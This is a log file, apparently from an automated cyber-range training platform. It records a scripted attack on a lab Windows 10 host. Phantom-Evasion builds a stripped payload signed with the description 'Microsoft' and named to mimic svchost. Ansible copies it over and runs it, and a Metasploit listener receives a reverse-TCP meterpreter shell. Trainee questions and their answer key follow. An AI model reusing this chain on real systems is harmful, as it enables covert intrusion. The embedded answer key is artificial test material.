@@ -1,0 +1,73 @@
+2020-06-02 03:12:22,733- session-for-5ed57d51eee1312eacd50803 - INFO - Property Not Found
+2020-06-02 03:12:32,510- session-for-5ed57d51eee1312eacd50803 - INFO - ....................Parsing Scenario....................
+2020-06-02 03:12:32,511- session-for-5ed57d51eee1312eacd50803 - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 5, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}]
+2020-06-02 03:12:32,512- session-for-5ed57d51eee1312eacd50803 - INFO - *****************************Check tools status*****************************
+2020-06-02 03:12:32,512- session-for-5ed57d51eee1312eacd50803 - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible']
+2020-06-02 03:12:32,512- session-for-5ed57d51eee1312eacd50803 - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-06-02 03:12:32,512- session-for-5ed57d51eee1312eacd50803 - INFO - ansible = [32mTrue[0m
+2020-06-02 03:12:32,513- session-for-5ed57d51eee1312eacd50803 - INFO - msfconsole = [32mTrue[0m
+2020-06-02 03:12:32,513- session-for-5ed57d51eee1312eacd50803 - INFO - ansible = [32mTrue[0m
+2020-06-02 03:12:32,513- session-for-5ed57d51eee1312eacd50803 - INFO - ************************Updating Session Tactics**********************
+2020-06-02 03:12:32,518- session-for-5ed57d51eee1312eacd50803 - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-02 03:12:32,522- session-for-5ed57d51eee1312eacd50803 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-02 03:12:32,522- session-for-5ed57d51eee1312eacd50803 - INFO - Reason: payload generation
+2020-06-02 03:12:43,026- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert option: 1
+2020-06-02 03:12:43,683- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert option: 2
+2020-06-02 03:12:44,242- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert option: 2
+2020-06-02 03:12:45,802- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert payload number: 3
+2020-06-02 03:12:45,959- session-for-5ed57d51eee1312eacd50803 - INFO - Press Enter to continue: 
+2020-06-02 03:12:46,115- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-02 03:12:46,167- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert LPORT: 11020
+2020-06-02 03:12:46,221- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert output filename: scv_hosts
+2020-06-02 03:12:46,773- session-for-5ed57d51eee1312eacd50803 - INFO - Add multiple processes behaviour: n
+2020-06-02 03:12:48,095- session-for-5ed57d51eee1312eacd50803 - INFO - Strip executable\?: y
+2020-06-02 03:12:49,665- session-for-5ed57d51eee1312eacd50803 - INFO - Sign executable\?: y
+2020-06-02 03:12:49,718- session-for-5ed57d51eee1312eacd50803 - INFO - use already existing certificate: y
+2020-06-02 03:12:49,772- session-for-5ed57d51eee1312eacd50803 - INFO - Select a Certificate: 1
+2020-06-02 03:12:49,826- session-for-5ed57d51eee1312eacd50803 - INFO - Insert sign software description: Microsoft
+2020-06-02 03:12:51,112- session-for-5ed57d51eee1312eacd50803 - INFO - Press Enter to continue: 
+2020-06-02 03:12:51,570- session-for-5ed57d51eee1312eacd50803 - INFO - Please insert option: 0
+2020-06-02 03:12:51,571- session-for-5ed57d51eee1312eacd50803 - INFO - **************************Exploring Evaluation**********************
+2020-06-02 03:12:51,572- session-for-5ed57d51eee1312eacd50803 - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-02 03:12:51,573- session-for-5ed57d51eee1312eacd50803 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-02 03:13:02,428- session-for-5ed57d51eee1312eacd50803 - INFO - **************************Exploring Evaluation**********************
+2020-06-02 03:13:02,428- session-for-5ed57d51eee1312eacd50803 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-02 03:13:02,428- session-for-5ed57d51eee1312eacd50803 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-02 03:13:02,432- session-for-5ed57d51eee1312eacd50803 - INFO - No Exceptions Found
+2020-06-02 03:13:02,453- session-for-5ed57d51eee1312eacd50803 - INFO - post not needed
+2020-06-02 03:13:02,471- session-for-5ed57d51eee1312eacd50803 - INFO - exploit['LHOST'] not needed...
+2020-06-02 03:13:02,471- session-for-5ed57d51eee1312eacd50803 - INFO - exploit['LPORT'] not needed...
+2020-06-02 03:13:02,491- session-for-5ed57d51eee1312eacd50803 - INFO - cid: 22
+2020-06-02 03:13:02,491- session-for-5ed57d51eee1312eacd50803 - INFO - Starting Another Thread
+2020-06-02 03:13:02,492- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-02 03:13:04,221- metasploit-thread - INFO - {'job_id': 35, 'uuid': '2foi1fk1'}
+2020-06-02 03:13:04,227- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:07,240- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:07,499- session-for-5ed57d51eee1312eacd50803 - INFO - **************************Exploring Evaluation**********************
+2020-06-02 03:13:07,500- session-for-5ed57d51eee1312eacd50803 - INFO - Appending Generalize questions_answers
+2020-06-02 03:13:07,501- session-for-5ed57d51eee1312eacd50803 - INFO - Appending scenario-specific questions_answers
+2020-06-02 03:13:07,501- session-for-5ed57d51eee1312eacd50803 - INFO - *****************************Questions*****************************
+2020-06-02 03:13:07,502- session-for-5ed57d51eee1312eacd50803 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-02 03:13:07,502- session-for-5ed57d51eee1312eacd50803 - INFO - *****************************Actual Answers*****************************
+2020-06-02 03:13:07,503- session-for-5ed57d51eee1312eacd50803 - INFO - ['192.168.18.61', 11020, '%USERPROFILE%\\Downloads\\', 'scv_hosts']
+2020-06-02 03:13:07,509- session-for-5ed57d51eee1312eacd50803 - INFO - evaluation id:5ed57d51eee1312eacd50804
+2020-06-02 03:13:07,510- session-for-5ed57d51eee1312eacd50803 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-02 03:13:07,515- session-for-5ed57d51eee1312eacd50803 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-02 03:13:07,516- session-for-5ed57d51eee1312eacd50803 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-02 03:13:07,522- session-for-5ed57d51eee1312eacd50803 - INFO - command is scv_hosts.exe
+2020-06-02 03:13:10,270- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:13,299- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:16,327- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:19,331- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-06-02 03:13:19,343- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:22,368- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:25,394- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-02 03:13:28,437- metasploit-thread - INFO - Meterpreter Sessions {'4': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:11020', 'tunnel_peer': '192.168.18.53:50870', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 50870, 'target_host': '', 'username': 'root', 'uuid': 'oo8kbhba', 'exploit_uuid': '2foi1fk1', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-06-02 03:13:28,447- metasploit-thread - INFO - Meterpreter Session found in list!, with ID = 4
+2020-06-02 03:13:28,449- metasploit-thread - INFO - ....................Meterpreter Session List...............................
+2020-06-02 03:13:28,456- metasploit-thread - INFO - {'4': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:11020', 'tunnel_peer': '192.168.18.53:50870', 'via_exploit': 'exploit/multi/handler', 'via_payload': 'payload/windows/x64/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 50870, 'target_host': '', 'username': 'root', 'uuid': 'oo8kbhba', 'exploit_uuid': '2foi1fk1', 'routes': '', 'arch': 'x64', 'platform': 'windows'}}
+2020-06-02 03:13:28,457- metasploit-thread - INFO - ....................Connected Meterpreter Session Id: 4....................
+2020-06-02 03:13:46,152- session-for-5ed57d51eee1312eacd50803 - INFO - **************************Exploring Evaluation**********************
+2020-06-02 03:13:46,152- session-for-5ed57d51eee1312eacd50803 - WARNING - Mitre/Challenges/Execution.json  not found
+2020-06-02 03:13:46,152- session-for-5ed57d51eee1312eacd50803 - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-06-02 03:13:46,152- session-for-5ed57d51eee1312eacd50803 - INFO - ....................Destroying Session.....................................
